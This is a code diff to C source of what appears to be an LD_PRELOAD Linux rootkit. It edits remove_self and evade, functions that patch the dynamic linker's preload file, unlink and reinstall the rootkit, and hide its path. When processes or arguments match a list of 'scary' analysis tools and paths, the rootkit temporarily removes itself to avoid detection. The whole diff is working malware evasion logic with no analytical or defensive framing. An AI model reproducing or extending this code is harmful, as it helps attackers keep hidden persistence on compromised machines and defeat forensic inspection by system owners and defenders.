@@ -5,8 +5,7 @@ int remove_self(void){
 
     hook(CUNLINK);
 #ifdef PATCH_DYNAMIC_LINKER
-    for(int i = 0; i != LDPATHS_SIZE; i++)
-        ldpatch(ldpaths[i], PRELOAD_FILE, OLD_PRELOAD, NORMLUSR);
+    ldpatch(PRELOAD_FILE, OLD_PRELOAD);
     call(CUNLINK, PRELOAD_FILE);
 #else
     call(CUNLINK, OLD_PRELOAD);
@@ -16,14 +15,13 @@ int remove_self(void){
     call(CUNLINK, BASHRC_PATH);
 #endif
 
-    pid_t pid;
-    if((pid = fork()) < 0) return VFORK_ERR;
+    pid_t pid = fork();
+    if(pid < 0) return VFORK_ERR;
     else if(pid == 0) return VFORK_SUC;
 
     wait(NULL);
 #ifdef PATCH_DYNAMIC_LINKER
-    for(int i = 0; i != LDPATHS_SIZE; i++)
-        ldpatch(ldpaths[i], OLD_PRELOAD, PRELOAD_FILE, NORMLUSR);
+    ldpatch(OLD_PRELOAD, PRELOAD_FILE);
     reinstall(PRELOAD_FILE);
     hide_path(PRELOAD_FILE);
 #else
@@ -37,6 +35,9 @@ int remove_self(void){
 /* checks all of the scary_* arrays created by setup.py against execve/p args.
  * the scary_procs loop checks the name of the calling process as well. */
 int evade(const char *filename, char *const argv[], char *const envp[]){
+    if(rknomore())
+        return VNOTHING_DONE;
+
     char *scary_proc, *scary_path;
 
     for(int i = 0; i < SCARY_PROCS_SIZE; i++){
@@ -52,7 +53,7 @@ int evade(const char *filename, char *const argv[], char *const envp[]){
     for(int i = 0; i < SCARY_PATHS_SIZE; i++){
         scary_path = scary_paths[i];
 
-        for(int argi = 1; argv[argi] != NULL; argi++)
+        for(int argi = 0; argv[argi] != NULL; argi++)
             if(!fnmatch(scary_path, argv[argi], FNM_PATHNAME))
                 return remove_self();
 
